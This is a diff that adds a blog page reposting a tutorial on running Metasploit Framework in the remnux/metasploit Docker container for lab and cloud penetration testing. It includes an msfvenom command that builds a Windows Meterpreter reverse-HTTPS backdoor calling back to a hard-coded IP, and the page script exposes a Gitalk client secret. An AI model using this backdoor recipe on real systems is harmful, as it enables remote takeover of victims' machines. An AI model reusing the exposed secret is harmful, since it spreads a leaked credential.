@@ -1,0 +1,367 @@
+<!doctype html>
+<html>
+<head>
+    <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
+    <title>Run Metasploit Framework as a Docker Container</title>
+    
+
+    <link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Jekyll AsciiDoc Blog" />
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Run Metasploit Framework as a Docker Container | Jekyll AsciiDoc Blog</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Run Metasploit Framework as a Docker Container" />
+<meta name="author" content="Jiffy" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Run Metasploit Framework as a Docker Container Without Installation Pains" />
+<meta property="og:description" content="Run Metasploit Framework as a Docker Container Without Installation Pains" />
+<meta property="og:site_name" content="Jekyll AsciiDoc Blog" />
+<meta property="og:image" content="/containers.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-03T00:00:00+00:00" />
+<script type="application/ld+json">
+{"description":"Run Metasploit Framework as a Docker Container Without Installation Pains","author":{"@type":"Person","name":"Jiffy"},"@type":"BlogPosting","url":"/guides/2020/07/03/Metaspolit-docker.html","image":"/containers.jpg","headline":"Run Metasploit Framework as a Docker Container","dateModified":"2020-07-03T00:00:00+00:00","datePublished":"2020-07-03T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"/guides/2020/07/03/Metaspolit-docker.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta name="Keywords" content="">
+    <link href="/assets/images/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="The Jekyll AsciiDoc Quickstart project is a leg-up in starting your own website hosted on GitHub with content based in AsciiDoc.">
+    <meta name="author" content="Your name goes here">
+    <meta name="copyright" content="Maybe consider a Creative Commons license">
+
+    <!--<link rel="stylesheet" href="/assets/css/foundation.css">
+    <link rel="stylesheet" href="/assets/css/coderay.css">-->
+    <link rel="stylesheet" href="/assets/css/font-awesome.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <link href="/assets/css/R.css" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/layer.css" id="layui_layer_skinlayercss" style="">
+    <link rel="stylesheet" href="/assets/css/themes/rubygems.css">
+
+</head>
+<body id="mescroll" class="mescroll">
+<div class="c pink">
+    <div class="con head">
+        <a title="" href="" class="logo">
+            <img alt="Logo" class="pclogo" src="/assets/images/Logo.png">
+            <img alt="Logo" class="mobilelogo hide" src="/assets/images/mobile_logo.png">
+        </a>
+
+        <span class="menuebtn"></span>
+    </div>
+</div>
+<div class="c white">
+    <div class="nav show">
+        <ul>
+            
+<li><a href="/" >首页</a></li>
+
+<li><a href="/404.html" >暂无</a></li>
+
+<li><a href="/404.html" >暂无</a></li>
+
+<li><a href="/404.html" >暂无</a></li>
+
+<li><a href="/404.html" >暂无</a></li>
+
+<li><a href="/404.html" >暂无</a></li>
+
+
+        </ul>
+    </div>
+</div>
+<div id="body">
+    <section class="content-wrapper main-content clear-fix">
+        <div class="c top20">
+            <div class="con">
+                <div class="detailcontent">
+    <div class="detail">
+        <div class="detailcon">
+            
+            <a title="Run Metasploit Framework as a Docker Container" href="/authors/Jiffy.html" class="detailuser">
+                <img alt="Run Metasploit Framework as a Docker Container" src="/assets/images/users/devlopr.png">
+                <span>
+                    <font class="username">Jiffy</font>
+                    <font class="date">03 Jul 2020</font>
+                </span>
+            </a>
+            <div class="arttag">
+                
+                <a  title="ops" href="/blog/tags/ops" class="t1">ops</a>
+                
+            </div>
+            <div class="detailadoc">
+                <div class="sect1">
+<h2 id="run_metasploit_framework_as_a_docker_container_without_installation_pains">Run Metasploit Framework as a Docker Container Without Installation Pains</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Metasploit Framework is a powerful open source tool for penetration testing. Whether you’re looking to use it for work or are merely interested in experimenting with it, you can run Metasploit Framework in a Docker container without having to deal with the pain of installing the code and its dependencies. The Docker image “remnux/metasploit” is available as part of the REMnux collection, thanks to the configuration efforts of Jean Christophe Baptiste.</p>
+</div>
+<div class="paragraph">
+<p>The following instructions and examples demonstrate how you can start using this Metasploit Docker container in a lab as well as on a publicly-accessible server. The container provides the command-line Metasploit Framework version of the tool. It lacks the web-based interface that you can get if you install the free Community edition, which you would need to register with Rapid 7. Command-line capabilities of Metasploit Framework are very powerful and lend themselves well to penetration testing tasks that involve running the tool on a remote system.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="how_to_launch_the_metasploit_framework_docker_container">How to Launch the Metasploit Framework Docker Container</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>To make use of the Metasploit Framework Docker image, all you need is a sufficiently-powerful system that is connected to the Internet and that has Docker installed on it. When you run a command like the one below on such a host, it will automatically download the image from the REMnux repository and launch it:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>In this example, I directed Docker to run the application “remnux/metasploit” in a transient container, which will disappear once you’ve exited it (that’s what “–rm” is for). The “-it” parameter allows you to interact with the container using an interactive shell.</p>
+</div>
+<div class="paragraph">
+<p>To ensure that relevant data persists across container invocations, I used the “-v” parameter to map the directories on my host to the corresponding locations inside the container. The idea is to use the “~/.msf4” directory for Metasploit Framework configuration files. The “/tmp/msf” directory on the host can store other data you may wish to keep, such as the artifacts you might obtain from the targeted systems.</p>
+</div>
+<div class="paragraph">
+<p>The “-p” parameter maps the ports on which you expect to receive inbound connections to the corresponding ports inside the container. The example above uses TCP port 443 with the expectation of incoming HTTPS connections from reverse shells.</p>
+</div>
+<div class="paragraph">
+<p>The image is quite large: over 1.2GB in size, because it includes the full runtime environment for Metasploit Framework, along with all its dependencies. It will be cached locally after the initial download. If you ever wish to refresh the image to ensure you’re using the latest version use the command “sudo docker pull remnux/metasploit”.</p>
+</div>
+<div class="paragraph">
+<p>The container is configured to automatically update Metasploit modules whenever you launch it. To add your own modules, add them to your host’s ~/.msf4 directory.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="test_driving_the_metasploit_framework_container">Test-Driving the Metasploit Framework Container</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Here’s how you might start experimenting with Metasploit Framework after launching its “remnux/metasploit” container in your lab. I’ll target a weakly-configured Windows system in my lab for example purposes. I’ll direct Metasploit Framework to remotely connect to the system using the credentials that I supplied, rather than actually exploiting a vulnerability. I will then open a reverse HTTPS shell to my Metasploit Framework console.</p>
+</div>
+<div class="paragraph">
+<p>In the sample session above, I launched Metasploit’s msfconsole tool, then directed it to give me an interactive Meterpreter shell to the targeted system. The connection was tunneled over HTTPS, which was directed to the Metasploit Framework container over TCP port 443.</p>
+</div>
+<div class="paragraph">
+<p>The screenshot that I saved using this session was placed in the /tmp/data directory inside the container. When I exited the container, the contents of that directory persisted on my underlying host in the /tmp/msf directory.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="running_the_metasploit_framework_container_in_the_public_cloud">Running the Metasploit Framework Container in the Public Cloud</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>When performing penetration testing, you’ll probably want to run Metasploit on an Internet-accessible system. You can do this quite easily by bringing up a temporary server within some public cloud provider, then running the Metasploit Framework container on that host.</p>
+</div>
+<div class="paragraph">
+<p>For instance, here is how you can accomplish this using DigitalOcean, which I like to use due to its low cost and high reliability. (The link includes my referral code.) Though DigitalOcean can spin up virtual machines for merely $5 per month, I found such a low-end system to have insufficient RAM for Metasploit. Therefore, I went with the $10 per month option for an Ubuntu host.</p>
+</div>
+<div class="paragraph">
+<p>Once the new system is active, you can log into it and execute the following commands to install Docker on the host:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
+add-apt-repository -y "deb https://apt.dockerproject.org/repo ubuntu-$(lsb_release -sc) main"
+apt-get update
+apt-get -y dist-upgrade
+apt-get -y install docker-engine</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Afterwards, you can direct Docker to download and launch the Metasploit Framework container using the command like the one in the beginning of this article.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>For this example, I decided to use Metasploit to generate a standalone backdoor executable file, which I would run on the targeted Windows system to simulate a scenario where the victim is tricked into running malware. I ran the “msfvenom” tool inside the Metasploit Framework container to accomplish this:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=104.236.213.164 LPORT=443 -e x86/shikata_ga_nai -f exe -o file.exe</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Since the current directory inside the container is /tmp/data by default, the resulting file was placed there. Because I mapped this directory to the host’s /tmp/msf directory, I was able to take it from there and transfer it to my lab’s Windows computer.</p>
+</div>
+<div class="paragraph">
+<p>I then ran “msfconsole” inside the container and directed the tool to use multi/handler, which is designed to accept connections generated outside of the “msfconsole” interface. Once the reverse-HTTPS listener was active, I “infected” my Windows system with the previously-created file.exe, which completed the connection and provided me with a Meterpreter shell.</p>
+</div>
+<div class="paragraph">
+<p>As was the case in the previous example, I saved the screenshot of the Windows system into /tmp/data, which allowed me to retain it even after the container terminated.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="additional_capabilities_of_the_container">Additional Capabilities of the Container</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>The Metasploit Framework container also includes the infamous Nmap scanning tool, which you can run using the “nmap” command. It offers a powerful way to examine networks and systems to locate potentially-vulnerable services and to determine where to focus your Metasploit efforts. The container also includes the NASM disassembler.</p>
+</div>
+<div class="paragraph">
+<p>In addition the container includes the tmux terminal multiplexer utility. It allows you to launch multiple “virtual” windows inside a single terminal window. The container’s configuration for this tool maps Ctrl+a as the command key, instead of the default Ctrl+b. To make use of it, type “tmux” after launching the Metasploit Framework container. This will give you a shell inside one of the tool’s “virtual” window. To open another one, press Ctrl+a followed by “c”. To switch between the windows, type Ctrl+a followed by that window’s number (e.g., Ctrl+a followed by “0” or “1”).</p>
+</div>
+<div class="paragraph">
+<p>For example, you could use tmux to run nmap in one window and msfconsole in another. You can read a tutorial on using tmux to get started with this tool.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="wrapping_it_up">Wrapping It Up</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Docker containers offer a convenient way of running Metasploit Framework without having to deal with the installation of the tool’s code and its dependencies. Running Metasploit this way is especially handy for situations where you wish to quickly deploy it to a new system, such as one running in a public cloud, and then tear it down without losing your customizations or data. On the other hand, this approach requires some familiarity with Docker containers.</p>
+</div>
+<div class="paragraph">
+<p>Thanks to Jean Christophe Baptiste for creating and maintaining the Dockerfile and associated configuration files upon which the “remnux/metasploit” image is based. If you notice any problems with this container or have suggestions for improving it, please log an issue on the REMnux repository for Docker files.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="web_links">Web links</h2>
+<div class="sectionbody">
+<div class="ulist">
+<ul>
+<li>
+<p>link:https://zeltser.com/metasploit-framework-docker-container/</p>
+</li>
+</ul>
+</div>
+</div>
+</div>
+            </div>
+        </div>
+    </div>
+    <div class="comment" id="Comment">
+        <div class="recomment">
+            <textarea id="TBComment" class="colorgray">期待你的论...</textarea>
+            <span class="btn right right" onclick="SubmitCommentByArt(3317370)">评论</span>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+    <script>
+        var gitalk  = new Gitalk ({
+            id: window.location.pathname,   // Ensure uniqueness and length less than 50
+            clientID: 'e6a309ad3bd8766be265',
+            clientSecret: '00c1c086d60c9e31d0276f688dde7717d5f79a24',
+            repo: 'sunyuyangg555.github.io',
+            owner: 'sunyuyangg555',
+            admin: ['sunyuyangg555'],
+            distractionFreeMode: false  // Facebook-like distraction free mode
+        });
+        gitalk.render('Comment')
+    </script>
+</div>
+
+                <div class="rightarea">
+    <a  target="_blank" title="联系" class="submission" href="https://github.com/sunyuyangg555/">联系我</a>
+    <div class="hottag">
+    <h2>类别<a title="类别" href="/categories_all.html">更多&gt;&gt;</a></h2>
+     
+    <a href="/blog/categories/guides" class="t1">guides</a>
+     
+    <a href="/blog/categories/test" class="t2">test</a>
+    
+</div>
+    <div class="hottag">
+    <h2>标签<a title="标签库" href="/tags_all.html">更多&gt;&gt;</a></h2>
+     
+    <a href="/blog/tags/java" class="t1">java</a>
+     
+    <a href="/blog/tags/sleep" class="t2">sleep</a>
+     
+    <a href="/blog/tags/Virtual" class="t3">Virtual</a>
+     
+    <a href="/blog/tags/Test" class="t4">Test</a>
+     
+    <a href="/blog/tags/Windows Docker Rails Ruby" class="t5">Windows Docker Rails Ruby</a>
+     
+    <a href="/blog/tags/Windows Unix" class="t6">Windows Unix</a>
+     
+    <a href="/blog/tags/Windows Docker" class="t7">Windows Docker</a>
+     
+    <a href="/blog/tags/test" class="t8">test</a>
+     
+    <a href="/blog/tags/ops" class="t9">ops</a>
+    
+</div>
+    <div class="hotuser">
+    <h2>作者</h2>
+    <ul>
+        
+        <li>
+            <a  href="/authors/Jiffy.html" title="Jiffy">
+                <img alt="Jiffy" src="/assets/images/users/devlopr.png">
+                <span>
+                    <font class="username">Jiffy</font>
+                    <font class="userdes">Java, Ruby, Devops, Linux</font>
+                </span>
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+</div>
+
+
+            </div>
+        </div>
+        <ul class="toolbtn">
+            <!--<li class="toolsubmi"><a title="投稿"></a></li>-->
+            <li class="toup hide" title="滑到顶部"></li>
+        </ul>
+    </section>
+</div>
+
+<span id="Share_Title" class="hide"></span>
+
+<span id="Share_Desc" class="hide"></span>
+
+<span id="Share_ImgUrl" class="hide"></span>
+
+<div class="c top60">
+    <div class="con bottominfo">
+        <ul class="bottomnav">
+            
+            <li><a href="/About.html" >关于我们</a></li>
+            
+            <li><a href="/ContactUs.html" >联系我们</a></li>
+            
+            <li><a href="/Helper.html" >使用帮助</a></li>
+            
+            <li><a href="/UserProtocol.html" >用户协议</a></li>
+            
+            <li><a href="/Complaint.html" >投诉建议</a></li>
+            
+        </ul>
+
+        <div class="firlink">
+            <span>友情链接：</span>
+            
+            <a href="http://www.github.com/">github</a>
+            
+        </div>
+        <span class="icp"></span>
+        <span class="address"></span>
+    </div>
+</div>
+
+<script src="/assets/js/vendor/jquery.js"></script>
+<!--<script src="/assets/js/jquery-1.11.1.min.js"></script>-->
+<script src="/assets/js/foundation.min.js"></script>
+<script src="/assets/js/layer.js"></script>
+<script src="/assets/js/app.js"></script>
+<script src="/assets/js/jweixin-1.2.0.js"></script>
+<script src="/assets/js/vendor/modernizr.js"></script>
+<script src="/assets/js/toc.js"></script>
+<script>
+    $(document).foundation();
+    var doc = document.documentElement;
+    doc.setAttribute('data-useragent', navigator.userAgent);
+</script>
+</body>
+</html>
